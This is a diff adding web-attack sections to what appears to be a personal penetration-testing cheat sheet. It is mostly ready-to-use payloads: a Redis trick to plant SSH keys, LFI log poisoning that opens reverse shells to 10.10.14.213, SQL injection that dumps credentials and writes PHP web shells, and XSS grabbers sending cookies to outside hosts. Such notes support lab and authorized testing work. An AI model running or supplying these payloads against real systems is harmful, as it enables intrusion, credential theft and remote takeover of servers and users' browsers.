+root@kali:$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
+root@kali:$ redis-cli -h 127.0.0.1 flushall
+root@kali:$ cat foo.txt | redis-cli -h 127.0.0.1 -x set pwn
+root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
+root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/lib/redis/.ssh
+root@kali:$ redis-cli -h 127.0.0.1 save
+```
+
+
 
 
 
 # Web
+
+
+
+
+## LFI/RFI
+
+
+
+### PHP RFI with SMB
+
+* [www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
+
+`/etc/samba/smb.conf`:
+
+```
+log level = 3
+[share]
+        comment = TEMP
+        path = /tmp/smb
+        writable = no
+        guest ok = yes
+        guest only = yes
+        read only = yes
+        browsable = yes
+        directory mode = 0555
+        force user = nobody
+```
+
+```
+root@kali:$ chmod 0555 /tmp/smb
+root@kali:$ chown -R nobody:nogroup /tmp/smb
+root@kali:$ service smbd restart
+root@kali:$ tail -f /var/log/samba/log.<HOSTNAME>
+```
+
+
+
+### Log Poisoning
+
+
+#### PHP
+
+* [medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
+* [outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)
+
+Access log (needs single `'` instead of double `"`):
+
+```
+root@kali:$ nc 127.0.0.1 80
+GET /<?php system($_GET['cmd']); ?>
+
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+Or
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+```
+
+Error log:
+
+```
+root@kali:$ curl -X POST 'http://127.0.0.1/vuln1.php' --form "userfile=@docx/sample.docx" --form 'submit=Generate pdf' --referer 'http://nowhere.com/<?php system($_GET["cmd"]); ?>'
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+Or
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+```
+
+
+
+
+## SQLi
+
+
+
+### sqlmap
+
+* [Usage · sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)
+
+Write file:
+
+```
+$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetpub/wwwroot/backdoor.php
+```
+
+Test WAF:
+
+* [www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/](https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/)
+
+```
+$ sqlmap.py -u 'https://127.0.0.1/index.php' --data='{"id":"*"}' -p id --identify-waf --tamper='between,randomcase,space2comment' --random-agent --tor --check-tor --thread=1 -b --batch -v6
+```
+
+
+
+### DIOS
+
+* [defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
+* [www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
+* [dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server](https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server)
+* [www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/](https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/)
+
+MySQL:
+
+```
+id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (information_schema.columns) WHERE (@a) IN (@a:=concat(@a,'<font color=red>',table_schema,'</font>',' ::: ','<font color=green>',table_name,'</font>','<br>'))))a);-- -
+
+SELECT (@a) FROM (
+	SELECT(@a:=0x00), (
+		SELECT (@a) FROM (information_schema.schemata)
+		WHERE (@a) IN (@a:=concat(@a,schema_name,'\n'))
+	)
+) foo
+```
+
+```
+id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (mytable.users) WHERE (@a) IN (@a:=concat(@a,':::',id,':::',login,':::',password)) AND is_admin='1'))a);-- -
+```
+
+
+
+### Truncation Attack
+
+* [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
+
+```
+POST /index.php HTTP/1.1
+Host: 127.0.0.1
+
+name=snovvcrash&email=admin%example.com++++++++++11&password=qwe12345
+```
+
+
+
+### Commas blocked by WAF
+
+```
+id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b ON 1=1#
+```
+
+
+
+### Write File
+
+```
+id=1' UNION ALL SELECT 1,2,3,4,"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2>&1' );} ?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
+```
+
+
+
+### Read File
+
+```
+id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
+```
+
+
+
+
+## XSS
+
+
+
+### Redirections
+
+* [developer.mozilla.org/ru/docs/Web/HTTP/Redirections](https://developer.mozilla.org/ru/docs/Web/HTTP/Redirections)
+
+```html
+<head> 
+  <meta http-equiv="refresh" content="0; URL=http://www.example.com/" />
+</head>
+```
+
+
+
+### Data Grabbers
+
+
+#### Cookies
+
+* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
+
+Img tag:
+
+```
+<img src="x" onerror="this.src='http://10.10.15.123/?c='+btoa(document.cookie)">
+```
+
+Fetch:
+
+```javascript
+<script>
+fetch('https://<SESSION>.burpcollaborator.net', {
+method: 'POST',
+mode: 'no-cors',
+body: document.cookie
+});
+</script>
+```
+
+
+
+### XMLHttpRequest
+
+
+#### XSS to LFI
+
+* [www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
+
+```javascript
+<script>
+var xhr = new XMLHttpRequest;
+xhr.onload = function() {
+	document.write(this.responseText);
+};
+xhr.open("GET", "file:///etc/passwd");
+xhr.send();
+</script>
+```
+
+```
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText);};x.open("GET","file:///etc/passwd");x.send();</script>
+```
+
+
+#### XSS to CSRF
+
+* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+
+If the endpoint is accessible only from localhost:
+
+```javascript
+<script>
+var xhr;
+if (window.XMLHttpRequest) {
+	xhr = new XMLHttpRequest();
+} else {
+	xhr = new ActiveXObject("Microsoft.XMLHTTP");
+}
+xhr.open("POST", "/backdoor.php");
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.send("cmd=powershell -nop -exec bypass -f  \\\\10.10.15.123\\share\\rev.ps1");
+</script>
+```
+
+With capturing CSRF token first:
+
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('GET', '/email', true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('POST', '/email/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@example.com')
+};
+</script>
+```
 
 
 
@@ -4582,4 +4641,17 @@ Take own of a directory and remove it (run cmd.exe as admin):
 Cmd > takeown /F C:\$Windows.~BT\* /R /A 
 Cmd > icacls C:\$Windows.~BT\*.* /T /grant administrators:F 
 Cmd > rmdir /S /Q C:\$Windows.~BT\
+```
+
+
+
+
+## DISM
+
+
+
+### TelnetClient
+
+```
+Cmd > DISM /online /Enable-Feature /FeatureName:TelnetClient
 ```
